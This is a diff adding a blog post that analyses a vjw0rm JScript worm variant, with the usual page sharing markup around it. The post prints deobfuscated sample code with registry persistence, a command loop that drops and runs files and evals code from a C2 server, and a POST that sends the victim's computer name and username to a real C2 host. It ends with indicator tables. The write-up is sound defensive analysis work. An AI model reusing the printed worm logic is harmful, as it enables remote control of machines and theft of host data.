+    
+</h3><p>Now, this seems and feels simple here, but the key piece of information I have left out until this point is <em>slightly embarassing</em>. We&rsquo;ve all done it, but I actually had the syntax wrong for our dear friend WScript. I forgot to capitalise the S in script, which left me with an <code>Undefined Error</code>.</p>
+<p>Classically, instead of actually listening to the sage wisdom of said error, I went on a stackoverflow hunt to solve the bamboozle which served to not really answer anything. A quick break, a look at some <em>legitimate</em> WScript calls in random scripts, and a facepalm later, I changed the command and the darn thing worked.</p>
+<p>Execution of this resulted in a pop up in WScript Host.</p>
+<p>
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        srcset="
+          /posts/vjw0rm/wscript_output_hu9bd329eea67948720590e73214e9e1cb_113461_330x0_resize_box_3.png 330w,
+          /posts/vjw0rm/wscript_output_hu9bd329eea67948720590e73214e9e1cb_113461_660x0_resize_box_3.png 660w,
+          /posts/vjw0rm/wscript_output_hu9bd329eea67948720590e73214e9e1cb_113461_1024x0_resize_box_3.png 1024w,
+          /posts/vjw0rm/wscript_output_hu9bd329eea67948720590e73214e9e1cb_113461_1320x0_resize_box_3.png 2x"
+        src="/posts/vjw0rm/wscript_output_hu9bd329eea67948720590e73214e9e1cb_113461_660x0_resize_box_3.png"
+        alt="WScript"
+      />
+      
+    </figure>
+  
+
+
+<em>Figure 6: Wscript Output received through execution of file</em></p>
+<p>Well, well, well. This definitely looks a lot better than our first attempt via base64 decoding. The variables are all there and there is no funky encoding dramas this time around. I decided to run the command again, piping the output of the command into a file on disk to investigate further.</p>
+<pre tabindex="0"><code>wscript.exe .\vjworm_2.js &gt; vjworm_3.js
+</code></pre><p>The output looks much better now. All of the variables look readable (whilst horribly formatted at present). Now time to figure out each variable in turn.</p>
+<div id="the-analysis-deepens" class="anchor">The Analysis&hellip; deepens?></div>
+<h3 class="relative group">The Analysis&hellip; deepens? 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#the-analysis-deepens" aria-label="Anchor">#</a></span>        
+    
+</h3><p>In this section, we will be looking at each segment of the JS code and attempting to make each function human readable. The objective of this exercise is to clearly figure out:</p>
+<ul>
+<li>Where the malware persists</li>
+<li>C2 communications</li>
+<li>Any additional functions of the malware</li>
+</ul>
+<pre tabindex="0"><code>var sh = Cr(0);
+var fs = Cr(1);
+var spl = &#39;|V|&#39;;
+var Ch = &#39;\\&#39;;
+var VN = &#39;9/21&#39; + &#39;_&#39; + Ob(6);
+var fu = WScript.ScriptFullName;
+var wn = WScript.ScriptName;
+var U;
+try {
+	U = sh.RegRead(g[2]);
+} catch (err) {
+	var sv = fu.split(&#39;\\&#39;);
+	if (&#39;:\\&#39; + sv[1] == &#39;:\\&#39; + wn) {
+		U = &#39;TRUE&#39;;
+		sh.RegWrite(g[2], U, g[5]);
+	} else {
+		U = &#39;FALSE&#39;;
+		sh.RegWrite(g[2], U, g[5]);
+	}
+}
+</code></pre><p><em>Figure 7: Hard to read, arguably still &lsquo;obfuscated&rsquo; script</em></p>
+<p>To make reading this sample more confusing, global variables are defined at the beginning of this script making it harder to read. I went through the contents of the script, mapping each of the &rsquo;things&rsquo; each variable declaration does so that it made a little more sense.</p>
+<pre tabindex="0"><code>try {
+	reg_key_installed = sh.RegRead(&#39;HKCU\\vjw0rm&#39;);
+} catch (err) {
+	var sv = WScript.ScriptFullName.split(&#39;\\&#39;);
+	if (&#39;:\\&#39; + sv[1] == &#39;:\\&#39; + WScript.ScriptName) {
+		reg_key_exists = &#39;TRUE&#39;;
+		sh.RegWrite(&#39;HKCU\\vjw0rm&#39;, reg_key_installed, &#39;REG_SZ&#39;);
+	} else {
+		reg_key_exists = &#39;FALSE&#39;;
+		sh.RegWrite(&#39;HKCU\\vjw0rm&#39;, reg_key_installed, &#39;REG_SZ&#39;);
+	}
+}
+</code></pre><p><em>Figure 8: De-bamboozled, easier to read script showing persistence</em></p>
+<p>Once this section of code is made readable it reveals the primary persistence mechanism for this variant of vjw0rm. The malware will check to see whether the registry value of <code>HKCU\\vjworm</code> is present.</p>
+<p>Note: you could name these variables whatever you want, I just named them something that made sense to my weird brain.</p>
+<p>I continued to move through the script, deobfuscating the commands as I went. This way I was able to make sense of the functions of the malware.</p>
+<pre tabindex="0"><code>do {
+	try {
+		var path = Pt(&#39;Vre&#39;, &#39;&#39;); // directory that is appended to the C2
+		path = path.split(spl);
+		if (path[0] === &#39;Cl&#39;) {
+			WScript.Quit(1);
+		}
+		if (path[0] === &#39;Sc&#39;) {    
+			var s2 = Ex(&#39;temp&#39;) + &#39;\\&#39; + path[2];
+			var fi = fs.CreateTextFile(s2, true);
+			fi.Write(path[1]);
+			fi.Close();
+			sh.run(s2);
+		}
+		if (path[0] === &#39;Ex&#39;) {
+			eval(path[1]);
+		}
+		if (path[0] === &#39;Rn&#39;) {
+			var ri = fs.OpenTextFile(WScript.ScriptFullName, 1);
+			var fr = ri.ReadAll();
+			ri.Close();
+			VN = VN.split(&#39;_&#39;);
+			fr = fr.replace(VN[0], path[1]);
+			var wi = fs.OpenTextFile(WScript.ScriptFullName, 2, false);
+			wi.Write(fr);
+			wi.Close();
+			sh.run(&#39;wscript.exe //B &#34;&#39; + WScript.ScriptFullName + &#39;&#34;&#39;);
+			WScript.Quit(1);
+		}
+		if (path[0] === &#39;Up&#39;) {
+			var s2 = Ex(&#39;temp&#39;) + &#39;\\&#39; + path[2];
+			var ctf = fs.CreateTextFile(s2, true);
+			var gu = path[1];
+			gu = gu.replace(&#39;|U|&#39;, &#39;|V|&#39;);
+			ctf.Write(gu);
+			ctf.Close();
+			sh.run(&#39;wscript.exe //B &#34;&#39; + s2 + &#39;&#34;&#39;, 6);
+			WScript.Quit(1);
+		}
+		if (path[0] === &#39;Un&#39;) {
+			var s2 = path[1];
+			var vdr = WScript.ScriptFullName;
+			var regi = &#39;Nothing!&#39;;
+			s2 = s2.replace(&#39;%f&#39;, WScript.ScriptFullName).replace(&#39;%n&#39;, WScript.ScriptName).replace(&#39;%sfdr&#39;, vdr).replace(&#39;%RgNe%&#39;, regi);
+			eval(s2);
+			WScript.Quit(1);
+		}
+		if (path[0] === &#39;RF&#39;) {
+			var s2 = Ex(&#39;temp&#39;) + &#39;\\&#39; + path[2];
+			var fi = fs.CreateTextFile(s2, true);
+			fi.Write(path[1]);
+			fi.Close();
+			sh.run(s2);
+		}
+</code></pre><p><em>Figure 9: Deobfuscated C2 commands</em></p>
+<p>Moving down, I arrived at the C2 domain that was previously located through the base64 decoding exercise. Here, we can see all of the additional informaiton that is sent via the post requests to the C2. Key points:</p>
+<ul>
+<li>C2 domain has the <code>/vre</code> directory appended to it as per Figure 9</li>
+<li>We can determine the syntax of the data sent to the C2 from the infromation provided below</li>
+</ul>
+<pre tabindex="0"><code>function Pt(C, A) {
+	var X = Cr(3);
+	X.open(&#39;POST&#39;, &#39;http://javaautorun.duia.ro:5465/&#39; + path, false);
+	X.SetRequestHeader(&#39;User-Agent:&#39;, nf());
+	X.send(A);
+	return X.responsetext;
+}
+function nf() {
+	var victim_info, NT, i;
+	if (fs.fileexists(Ex(&#39;Windir&#39;) + &#39;\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe&#39;)) {
+		NT = &#39;YES&#39;;
+	} else {
+		NT = &#39;NO&#39;;
+	}
+	victim_info = campaign + blackslash + Ex(&#39;COMPUTERNAME&#39;) + blackslash + Ex(&#39;USERNAME&#39;) + blackslash + Ob(2) + blackslash + Ob(4) + blackslash + blackslash + NT + blackslash + reg_key_exits + blackslash;
+	return victim_info;
+</code></pre><p><em>Figure 10: C2 Domain and POST data syntax</em></p>
+<p>The User-Agent string is used to supply the C2 domain with information recovered from the victim machine</p>
+<pre tabindex="0"><code>POST /Vre HTTP/1.1
+Host: javaautorun.duia.ro:5465
+User-Agent: 9/21\COMPUTER-NAME\USERNAME\Operating_System\AntiVirus\NT\reg_key_exists
+</code></pre><p>Note: the values would reflect the actual data collected from the victim host</p>
+<div id="host-indicators" class="anchor">Host Indicators></div>
+<h3 class="relative group">Host Indicators 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#host-indicators" aria-label="Anchor">#</a></span>        
+    
+</h3><p>Analysis of the deobfuscated script reveals two key host artefacts that can be used to create signatures for this variant of vjw0rm and are key to successful remediation of the malware from the infected device.</p>
+<table>
+<thead>
+<tr>
+<th>Indicator</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>vbc.exe</code></td>
+<td><code>\Microsoft.NET\Framework\v2.0.50727\vbc.exe</code></td>
+</tr>
+<tr>
+<td>vjw0rm</td>
+<td><code>HKCU\vjw0rm</code></td>
+</tr>
+</tbody>
+</table>
+<div id="network-indicators" class="anchor">Network Indicators></div>
+<h3 class="relative group">Network Indicators 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#network-indicators" aria-label="Anchor">#</a></span>        
+    
+</h3><p>As previously identified, this malware seems to call out to the domain <code>http://javaautorun.duia[.]ro:5465/</code></p>
+<p>We know that this is a malicious indicator, but worth running this through virustotal to see whether there are any other reported community connections to the URL that might give us some additional indicators. The URL is flagged by a total of 15 AVs at the time of writing this blog. Additionally, it is outwardly listed as a bot network/command and control domain served by the IP address <code>41[.]190.14.132</code>. The IP address is once again confirmed by completion of a centralops.net domain search.</p>
+<table>
+<thead>
+<tr>
+<th>Network Indicator</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>http://javaautorun.duia[.]ro:5465/</code></td>
+<td>C2 Domain</td>
+</tr>
+<tr>
+<td><code>41[.]190.14.132</code></td>
+<td>IP Address of C2 (VirusTotal)</td>
+</tr>
+<tr>
+<td><code>41[.]217.29.212</code></td>
+<td>IP Address of C2 (Centralops)</td>
+</tr>
+<tr>
+<td><em>Figure 11: C2 Domains and their respective IP Addresses</em></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<div id="lessons-learned-in-analysis" class="anchor">Lessons Learned in Analysis></div>
+<h2 class="relative group">Lessons Learned in Analysis 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#lessons-learned-in-analysis" aria-label="Anchor">#</a></span>        
+    
+</h2><p>Analysis of this sample taught me a lot about how I deal with frustration, which is not to say <em>well</em>. This was the first real world sample that I dained to analyse and it really revealed to me my lack of general knowledge about JavaScript.</p>
+<p>I beat my head against the wall more than once, and on something some would arguably call &ldquo;simple&rdquo;. I grumped and grumbled, beating myself up for not understanding immediately how to deobfuscate the second layer of this code. I sat there for hours, wasting time caught up in my frustration instead of doing something simple and logical.</p>
+<p>Walking away.</p>
+<p>The key take aways this taught me was whenever you are starting to feel your brows twist, your body hunch over the keyboard and more sighs and growls than you ever thought would come out of your mouth&hellip; start&hellip; just walk away. Set a timer for an hour, do what you can and then go for a good walk.</p>
+<p>Secondly, don&rsquo;t beat yourself up unnecesarily just cause you &ldquo;haven&rsquo;t  had experience with running JavaScript code&rdquo; or &ldquo;I must be a terrible analyst cause I didn&rsquo;t <em>immediately</em> identify how to deobfuscate this sample&rdquo;. So what? Who cares, <em>you do now</em>. This technical report serves as evidence of that fact and working through your frustration has made you better for it.</p>
+<p>Thirdly, <em>look</em> and I mean <em>really look</em> at the obfuscated script in its entirety. Don&rsquo;t discount your hunches and make sure that, while you are analysing, you write down all of your leads so that you an explore them in full.</p>
+<div id="resources" class="anchor">Resources></div>
+<h2 class="relative group">Resources 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#resources" aria-label="Anchor">#</a></span>        
+    
+</h2><p>Throughout this analysis, I found the following resources very useful.</p>
+<table>
+<thead>
+<tr>
+<th>Article</th>
+<th>Description</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://lifars.com/wp-content/uploads/2021/09/Vjw0rm-.pdf"   target="_blank">
+    LIFARS Analysis of vjWorm</a></td>
+<td>Analysis of an older variant of vjw0rm, they talk through the steps they took to get rid of the obfuscated layers. A complete sample of the worm.</td>
+<td>Great alternative method for deobfuscating JS</td>
+</tr>
+<tr>
+<td><a href="https://c3rb3ru5d3d53c.github.io/documents/deobfuscating-scripts/"   target="_blank">
+    Malware Hell - Deobfuscating Scripts</a></td>
+<td>How to deobfuscate various script types commonly used by malware</td>
+<td>Provided a good approach to deobfuscation of JS for my brain in particular. Talked through console.log and some com object stuff that really got me thinking</td>
+</tr>
+</tbody>
+</table>
+
         </br></br>
         
       </div>
@@ -541,7 +1050,7 @@
         var liked_article = false
 
         if (typeof auth !== 'undefined') {
-          var oid = "views_posts\/content\/posts\/vjworm\/wscript_output.png.md"
+          var oid = "views_posts\/vjw0rm\/index.md"
           var id = oid ? oid.replaceAll("/", "-") : oid
 
           var viewed = localStorage.getItem(id);
@@ -570,7 +1079,7 @@
               });
           }
 
-          var oid_likes = "likes_posts\/content\/posts\/vjworm\/wscript_output.png.md"
+          var oid_likes = "likes_posts\/vjw0rm\/index.md"
           var id_likes = oid_likes ? oid_likes.replaceAll("/", "-") : oid_likes
 
           var liked = localStorage.getItem(id_likes);
@@ -641,7 +1150,7 @@
         }
 
         function process_article() {
-          var oid_likes = "likes_posts\/content\/posts\/vjworm\/wscript_output.png.md"
+          var oid_likes = "likes_posts\/vjw0rm\/index.md"
           var id_likes = oid_likes ? oid_likes.replaceAll("/", "-") : oid_likes
           if (!liked_article) {
             like_article(id_likes)
@@ -761,7 +1270,7 @@
         <a
           target="_blank"
           class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-          href="mailto:?body=https://polaryse.github.io/posts/content/posts/vjworm/wscript_output.png/&amp;subject="
+          href="mailto:?body=https://polaryse.github.io/posts/vjw0rm/&amp;subject=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
           title="Send via email"
           aria-label="Send via email"
           >
@@ -780,7 +1289,7 @@
         <a
           target="_blank"
           class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-          href="https://www.facebook.com/sharer/sharer.php?u=https://polaryse.github.io/posts/content/posts/vjworm/wscript_output.png/&amp;quote="
+          href="https://www.facebook.com/sharer/sharer.php?u=https://polaryse.github.io/posts/vjw0rm/&amp;quote=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
           title="Share on Facebook"
           aria-label="Share on Facebook"
           >
@@ -799,7 +1308,7 @@
         <a
           target="_blank"
           class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://polaryse.github.io/posts/content/posts/vjworm/wscript_output.png/&amp;title="
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://polaryse.github.io/posts/vjw0rm/&amp;title=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
           title="Share on LinkedIn"
           aria-label="Share on LinkedIn"
           >
@@ -818,7 +1327,7 @@
         <a
           target="_blank"
           class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-          href="https://pinterest.com/pin/create/bookmarklet/?url=https://polaryse.github.io/posts/content/posts/vjworm/wscript_output.png/&amp;description="
+          href="https://pinterest.com/pin/create/bookmarklet/?url=https://polaryse.github.io/posts/vjw0rm/&amp;description=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
           title="Pin on Pinterest"
           aria-label="Pin on Pinterest"
           >
@@ -837,7 +1346,7 @@
         <a
           target="_blank"
           class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-          href="https://reddit.com/submit/?url=https://polaryse.github.io/posts/content/posts/vjworm/wscript_output.png/&amp;resubmit=true&amp;title="
+          href="https://reddit.com/submit/?url=https://polaryse.github.io/posts/vjw0rm/&amp;resubmit=true&amp;title=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
           title="Submit to Reddit"
           aria-label="Submit to Reddit"
           >
@@ -856,7 +1365,7 @@
         <a
           target="_blank"
           class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-          href="https://twitter.com/intent/tweet/?url=https://polaryse.github.io/posts/content/posts/vjworm/wscript_output.png/&amp;text="
+          href="https://twitter.com/intent/tweet/?url=https://polaryse.github.io/posts/vjw0rm/&amp;text=Starting%20Small:%20Analysis%20of%20recent%20vjw0rm%20variant"
           title="Tweet on Twitter"
           aria-label="Tweet on Twitter"
           >
@@ -884,7 +1393,7 @@
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group" href="/posts/polaryse/assets/wscript_output.png/">
+            <a class="flex group" href="/posts/content/posts/vjworm/wscript_output.png/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -909,15 +1418,15 @@
         </span>
         <span>
           
-            <a class="flex text-right group" href="/posts/vjw0rm/">
+            <a class="flex text-right group" href="/posts/testpost/">
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Starting Small: Analysis of recent vjw0rm variant</span
+                  >An Introduction</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2022-11-20 00:00:00 &#43;0000 UTC">November 20, 2022</time>
+                    <time datetime="2022-11-26 00:00:00 &#43;0000 UTC">November 26, 2022</time>
                   
                 </span>
               </span>
@@ -941,6 +1450,14 @@
   </footer>
 </article>
 
+      
+      <div class="pointer-events-none absolute top-[100vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+        <a href="#the-top"
+          class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+          aria-label="" title="">
+          &uarr;
+        </a>
+      </div>
       
     </main><footer class="py-10 print:hidden">
   
